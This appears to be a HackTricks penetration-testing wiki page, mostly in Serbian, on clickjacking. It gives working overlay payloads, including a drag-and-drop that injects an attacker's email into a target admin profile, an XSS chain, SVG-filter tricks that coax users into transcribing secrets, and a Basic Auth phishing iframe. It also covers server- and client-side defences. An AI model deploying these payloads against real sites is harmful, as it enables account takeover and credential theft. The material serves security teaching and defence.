# Clickjacking

{{#include ../banners/hacktricks-training.md}}

## Šta je Clickjacking

U clickjacking napadu, **korisnik** biva **prevaren** da **klikne** na **element** na veb-stranici koji je ili **nevidljiv** ili maskiran kao drugi element. Ova manipulacija može dovesti do neželjenih posledica za korisnika, kao što su preuzimanje malware-a, preusmeravanje na zlonamerne veb-stranice, otkrivanje akreditiva ili osetljivih informacija, transfer novca ili kupovina proizvoda putem interneta.

### Prepopulate forms trick

Ponekad je moguće da se **popune vrednosti polja u formi koristeći GET parametre prilikom učitavanja stranice**. Napadač može zloupotrebiti ovo ponašanje da popuni formu proizvoljnim podacima i pošalje clickjacking payload tako da korisnik pritisne dugme Submit.

### Populate form with Drag\&Drop

Ako želite da korisnik **popuni formu**, ali ne želite direktno da tražite od njega da unese neke specifične podatke (npr. email ili tačnu lozinku koju znate), možete ga jednostavno zamoliti da **Drag\&Drop** nešto što će upisati podatke koje kontrolišete, kao u [**ovom primeru**](https://lutfumertceylan.com.tr/posts/clickjacking-acc-takeover-drag_drop/).

### Basic Payload
```css
<style>
iframe {
position:relative;
width: 500px;
height: 700px;
opacity: 0.1;
z-index: 2;
}
div {
position:absolute;
top:470px;
left:60px;
z-index: 1;
}
</style>
<div>Click me</div>
<iframe src="https://vulnerable.com/email?email=asd@asd.asd"></iframe>
```
### Višestepeni Payload
```css
<style>
iframe {
position:relative;
width: 500px;
height: 500px;
opacity: 0.1;
z-index: 2;
}
.firstClick, .secondClick {
position:absolute;
top:330px;
left:60px;
z-index: 1;
}
.secondClick {
left:210px;
}
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://vulnerable.net/account"></iframe>
```
### Drag\&Drop + Click payload
```css
<html>
<head>
<style>
#payload{
position: absolute;
top: 20px;
}
iframe{
width: 1000px;
height: 675px;
border: none;
}
.xss{
position: fixed;
background: #F00;
}
</style>
</head>
<body>
<div style="height: 26px;width: 250px;left: 41.5%;top: 340px;" class="xss">.</div>
<div style="height: 26px;width: 50px;left: 32%;top: 327px;background: #F8F;" class="xss">1. Click and press delete button</div>
<div style="height: 30px;width: 50px;left: 60%;bottom: 40px;background: #F5F;" class="xss">3.Click me</div>
<iframe sandbox="allow-modals allow-popups allow-forms allow-same-origin allow-scripts" style="opacity:0.3"src="https://target.com/panel/administration/profile/"></iframe>
<div id="payload" draggable="true" ondragstart="event.dataTransfer.setData('text/plain', 'attacker@gmail.com')"><h3>2.DRAG ME TO THE RED BOX</h3></div>
</body>
</html>
```
### XSS + Clickjacking

If you have identified an **XSS attack that requires a user to click** on some element to **trigger** the XSS and the page is **vulnerable to clickjacking**, you could abuse it to trick the user into clicking the button/link.\
Example:\
You found a **self XSS** in some private details of the account (details that **only you can set and read**). The page with the **form** to set these details is **vulnerable** to **Clickjacking** and you can **prepopulate** the **form** with the GET parameters.\
An attacker could prepare a **Clickjacking** attack to that page **prepopulating** the **form** with the **XSS payload** and **tricking** the **user** into **Submit** the form. So, **when the form is submitted** and the values are modified, the **user will execute the XSS**.

### DoubleClickjacking

Firstly [explained in this post](https://securityaffairs.com/172572/hacking/doubleclickjacking-clickjacking-on-major-websites.html), this technique would ask the victim to double click on a button of a custom page placed in a specific location, and use the timing differences between mousedown and onclick events to load the victim page duing the double click so the **victim actually clicks a legit button in the victim page**.

An example could be seen in this video: [https://www.youtube.com/watch?v=4rGvRRMrD18](https://www.youtube.com/watch?v=4rGvRRMrD18)

A code example can be found in [this page](https://www.paulosyibelo.com/2024/12/doubleclickjacking-what.html).

> [!WARNING]
> Ova tehnika omogućava da se korisnik prevari da klikne na jedno mesto na stranici žrtve, zaobilazeći sve zaštite protiv clickjacking-a. Dakle, napadač mora naći **osetljive radnje koje se mogu izvršiti sa samo jednim klikom, poput OAuth prompt-a za prihvatanje dozvola**.

### SVG Filters / Cross-Origin Iframe UI Redressing

Modern Chromium/WebKit/Gecko builds let CSS `filter:url(#id)` be applied to cross-origin iframes. The iframe’s rasterized pixels are exposed to the SVG filter graph as `SourceGraphic`, so primitives such as `feDisplacementMap`, `feBlend`, `feComposite`, `feColorMatrix`, `feTile`, `feMorphology`, etc. can arbitrarily warp the victim UI before the user sees it, even though the attacker never touches the DOM. A simple Liquid-Glass style filter looks like:
```html
<iframe src="https://victim.example" style="filter:url(#displacementFilter4)"></iframe>
```
* Korisne primitive: `feImage` učitava bitmap slike napadača (npr. overlays, displacement maps); `feFlood` gradi matte konstantne boje; `feOffset/feGaussianBlur` rafiniraju istaknute delove; `feDisplacementMap` lomi/iskrivljuje tekst; `feComposite operator="arithmetic"` implementira proizvoljnu po-kanalnu matematiku (`r = k1*i1*i2 + k2*i1 + k3*i2 + k4`), što je dovoljno za pojačavanje kontrasta, maskiranje i AND/OR operacije; `feTile` seče i replicira probe piksela; `feMorphology` uvećava/smanjuje konture; `feColorMatrix` premesta lumu u alfa da bi izgradio precizne maske.

#### Izobličavanje tajni u CAPTCHA-style upite

Ako framable endpoint renderuje tajne (tokens, reset codes, API keys), napadač ih može izobličiti tako da podsećaju na CAPTCHA i prisiliti ručnu transkripciju:
```html
<svg width="0" height="0">
<filter id="captchaFilter">
<feTurbulence type="turbulence" baseFrequency="0.03" numOctaves="4" result="noise" />
<feDisplacementMap in="SourceGraphic" in2="noise" scale="6" xChannelSelector="R" yChannelSelector="G" />
</filter>
</svg>
<iframe src="https://victim" style="filter:url(#captchaFilter)"></iframe>
<input pattern="^6c79 ?7261 ?706f ?6e79$" required>
```
Iskrivljeni pikseli varaju korisnika da „reši“ captcha unutar napadačem kontrolisanog `<input>` čiji `pattern` nameće pravu tajnu žrtve.

#### Rekontekstualizacija unosa žrtve

Filteri mogu hirurški obrisati placeholder/validation tekst dok zadržavaju unose korisnika. Jedan radni tok:

1. `feComposite operator="arithmetic" k2≈4` pojačava osvetljenost tako da sivi pomoćni tekst postane potpuno beo.
2. `feTile` ograničava radno područje na pravougaonik polja.
3. `feMorphology operator="erode"` zadebljava tamne glife koje je otkucala žrtva i skladišti ih putem `result="thick"`.
4. `feFlood` stvara belu podlogu, `feBlend mode="difference"` sa `thick`, a drugi `feComposite k2≈100` to pretvara u jaku luma masku.
5. `feColorMatrix` prenosi tu lumu u alfa kanal, a `feComposite in="SourceGraphic" operator="in"` zadržava samo glife koje je uneo korisnik.
6. Još jedan `feBlend in2="white"` plus tanka obrezivanja daje čist textbox, nakon čega napadač preklapa sopstvene HTML oznake (npr. “Enter your email”) dok skriveni iframe i dalje sprovodi politiku lozinki porekla žrtve.

Safari ima problema sa `feTile`; isti efekat može se reprodukovati prostornim maskama izgrađenim od `feFlood` + `feColorMatrix` + `feComposite` za WebKit-only payloads.

#### Piksel-probe, logika i state mašine

Obrezivanjem regiona od 2–4 px sa `feTile` i tilovanjem tog uzorka na `100%` viewport-a, napadač transformiše uzorkovanu boju u teksturu preko celog frejma koja se može pragovati u boolean masku:
```html
<filter id="pixelProbe">
<feTile x="313" y="141" width="4" height="4" />
<feTile x="0" y="0" width="100%" height="100%" result="probe" />
<feComposite in="probe" operator="arithmetic" k2="120" k4="-1" />
<feColorMatrix type="matrix" values="0 0 0 0 0  0 0 0 0 0  0 0 0 0 0  0 0 1 0 0" result="mask" />
<feGaussianBlur in="SourceGraphic" stdDeviation="2" />
<feComposite operator="in" in2="mask" />
<feBlend in2="SourceGraphic" />
</filter>
```
Za proizvoljne boje, referenca `feFlood` (npr. `#0B57D0`) zajedno sa `feBlend mode="difference"` i još jednim arithmetic composite-om (`k2≈100`, `k4` kao tolerancija) daje belu boju samo kada uzorak piksela odgovara ciljnoj nijansi. Unošenjem ovih maski u `feComposite` sa podešenim `k1..k4` dobijaju se logički gate-ovi: `AND` via `k1=1`, `OR` via `k2=k3=1`, `XOR` via `feBlend mode="difference"`, `NOT` via blending against white. Povezivanjem gate-ova gradi se full adder inside the filter graph, što dokazuje da je pipeline funkcionalno kompletan.

Napadači mogu zato čitati stanje UI bez JavaScripta. Primeri boolean vrednosti iz modalnog workflow-a:

- **D** (dialog visible): proverite zamračeni ugao i testirajte prema beloj.
- **L** (dialog loaded): proverite koordinate na kojima se dugme pojavi kada je spremno.
- **C** (checkbox checked): uporedite piksel checkbox-a sa aktivnom plavom `#0B57D0`.
- **R** (red success/failure banner): koristite `feMorphology` i crvene pragove unutar pravougaonika bannera.

Svako detektovano stanje aktivira različitu overlay bitmapu ugrađenu preko `feImage xlink:href="data:..."`. Maskiranjem tih bitmapa sa `D`, `L`, `C`, `R`, overlay-i ostaju sinhronizovani sa stvarnim dijalogom i vode žrtvu kroz višestepene workflow-e (reset lozinke, odobrenja, destruktivne potvrde) bez izlaganja DOM-a.

### Sandboxed iframe Basic Auth dijalog (no allow-popups)

Sandboxed iframe bez `allow-popups` i dalje može prikazati browser-controlled **HTTP Basic Authentication modal** kada odgovor na zahtev vrati `401` sa `WWW-Authenticate`. Dijalog je pokrenut od strane networking/auth sloja browsera (ne JS `alert/prompt/confirm`), pa ograničenja popupa u sandboxu **ne** poništavaju njegovo pojavljivanje. Ako možete scriptovati iframe (npr. `sandbox="allow-scripts"`), možete ga navigirati na bilo koji endpoint koji izda Basic Auth challenge:
```html
<iframe id="basic" sandbox="allow-scripts"></iframe>
<script>
basic.src = "https://httpbin.org/basic-auth/user/pass"
</script>
```
Kada stigne odgovor, pregledač zatraži kredencijale iako su pop-upovi onemogućeni. Iframovanjem poverenog origin-a ovom tehnikom omogućava se UI redress/phishing: neočekivani modalni prozori unutar "sandboxed" widgeta mogu zbuniti korisnike ili pokrenuti menadžere lozinki da ponude sačuvane kredencijale.

### Browser extensions: DOM-based autofill clickjacking

Osim iframovanja stranica žrtve, napadači mogu ciljano napasti UI elemente proširenja pretraživača koji se ubacuju u stranicu. Menadžeri lozinki prikazuju autofill padajuće liste blizu fokusiranih input polja; fokusiranjem polja kojim upravlja napadač i skrivanjem/zaklanjanjem padajućeg menija ekstenzije (trikovi sa opacity/overlay/top-layer), prinudni klik korisnika može izabrati sačuvan unos i popuniti osetljive podatke u napadačem kontrolisana input polja. Ova varijanta ne zahteva izlaganje kroz iframe i funkcioniše isključivo putem DOM/CSS manipulacije.

- For concrete techniques and PoCs see:
{{#ref}}
browser-extension-pentesting-methodology/browext-clickjacking.md
{{#endref}}

## Strategije za zaštitu od Clickjacking

### Klijentske odbrane

Skriptovi koji se izvršavaju na strani klijenta mogu preduzeti mere za sprečavanje Clickjacking-a:

- Osiguravanje da je prozor aplikacije glavni (top) prozor.
- Prikazivanje svih frejmova.
- Onemogućavanje klikova na nevidljive frejmove.
- Detekcija i obaveštavanje korisnika o potencijalnim Clickjacking pokušajima.

Međutim, ovi frame-busting skriptovi se mogu zaobići:

- **Podešavanja bezbednosti pregledača:** Neki pregledači mogu blokirati ove skripte na osnovu svojih bezbednosnih podešavanja ili zbog nedostatka podrške za JavaScript.
- **HTML5 iframe `sandbox` atribut:** Napadač može neutralisati frame buster skripte tako što će postaviti `sandbox` atribut sa vrednostima `allow-forms` ili `allow-scripts` bez `allow-top-navigation`. To sprečava iframe da proveri da li je top prozor, npr.,
```html
<iframe
id="victim_website"
src="https://victim-website.com"
sandbox="allow-forms allow-scripts"></iframe>
```
The `allow-forms` and `allow-scripts` values enable actions within the iframe while disabling top-level navigation. To ensure the intended functionality of the targeted site, additional permissions like `allow-same-origin` and `allow-modals` might be necessary, depending on the attack type. Browser console messages can guide which permissions to allow.

### Odbrane na serverskoj strani

#### X-Frame-Options

HTTP zaglavlje odgovora **`X-Frame-Options`** obaveštava pregledače o legitimnosti renderovanja stranice u `<frame>` ili `<iframe>`, pomažući u sprečavanju Clickjacking-a:

- `X-Frame-Options: deny` - Nijedan domen ne može ugraditi sadržaj.
- `X-Frame-Options: sameorigin` - Samo isti sajt može ugraditi sadržaj.
- `X-Frame-Options: allow-from https://trusted.com` - Samo navedeni 'uri' može ugraditi stranicu.
- Napomena o ograničenjima: ako pregledač ne podržava ovu direktivu, ona možda neće funkcionisati. Neki pregledači preferiraju CSP `frame-ancestors` direktivu.

#### Content Security Policy (CSP) frame-ancestors directive

**`frame-ancestors` direktiva u CSP-u** je preporučeni metod zaštite od Clickjacking-a:

- `frame-ancestors 'none'` - Slično `X-Frame-Options: deny`.
- `frame-ancestors 'self'` - Slično `X-Frame-Options: sameorigin`.
- `frame-ancestors trusted.com` - Slično `X-Frame-Options: allow-from`.

Na primer, sledeći CSP dozvoljava ugradnju samo sa iste domene:

`Content-Security-Policy: frame-ancestors 'self';`

Dalji detalji i složeniji primeri mogu se naći u [frame-ancestors CSP documentation](https://w3c.github.io/webappsec-csp/document/#directive-frame-ancestors) i u [Mozilla's CSP frame-ancestors documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors).

### Content Security Policy (CSP) with `child-src` and `frame-src`

**Content Security Policy (CSP)** je bezbednosna mera koja pomaže u sprečavanju Clickjacking-a i drugih code injection attacks tako što precizira koje izvore pregledač treba da dozvoli za učitavanje sadržaja.

#### `frame-src` Directive

- Definiše validne izvore za frame-ove.
- Specifičniji je od `default-src` direktive.
```
Content-Security-Policy: frame-src 'self' https://trusted-website.com;
```
Ova politika dozvoljava frame-ove iz iste origin (self) i sa https://trusted-website.com.

#### `child-src` Direktiva

- Uvedena u CSP level 2 da bi odredila važeće izvore za web workers i frames.
- Služi kao rezervna opcija za `frame-src` i `worker-src`.
```
Content-Security-Policy: child-src 'self' https://trusted-website.com;
```
Ova politika dozvoljava frame-ove i workere iz iste origin (self) i sa https://trusted-website.com.

**Napomene o upotrebi:**

- Zastarevanje: child-src se postepeno ukida u korist frame-src i worker-src.
- Fallback ponašanje: Ako frame-src nedostaje, child-src se koristi kao fallback za frame-ove. Ako oba nedostaju, koristi se default-src.
- Stroga definicija izvora: Uključite samo pouzdane izvore u direktive kako biste sprečili zloupotrebu.

#### JavaScript Frame-Breaking Scripts

Iako nisu potpuno nepogrešivi, JavaScript-based frame-busting scripts se mogu koristiti da bi se sprečilo da se web stranica prikaže u frame-u. Primer:
```javascript
if (top !== self) {
top.location = self.location
}
```
#### Primena Anti-CSRF tokens

- **Validacija tokena:** Koristite anti-CSRF tokens u web aplikacijama kako biste osigurali da su zahtevi koji menjaju stanje namerni od strane korisnika, a ne pokrenuti sa Clickjacked stranice.

## Reference

- [**https://portswigger.net/web-security/clickjacking**](https://portswigger.net/web-security/clickjacking)
- [**https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html**](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html)
- [DOM-based Extension Clickjacking (marektoth.com)](https://marektoth.com/blog/dom-based-extension-clickjacking/)
- [SVG Filters - Clickjacking 2.0](https://lyra.horse/blog/2025/12/svg-clickjacking/)
- [Iframe sandbox Basic Auth modal](https://phor3nsic.github.io/2026/01/21/trick-iframe-sandbox.html)
- [Chromestatus: Restrict sandboxed frame dialogs](https://chromestatus.com/feature/4747009953103872)
- [Chromium issue about sandboxed auth dialogs](https://issues.chromium.org/issues/40266321)

{{#include ../banners/hacktricks-training.md}}
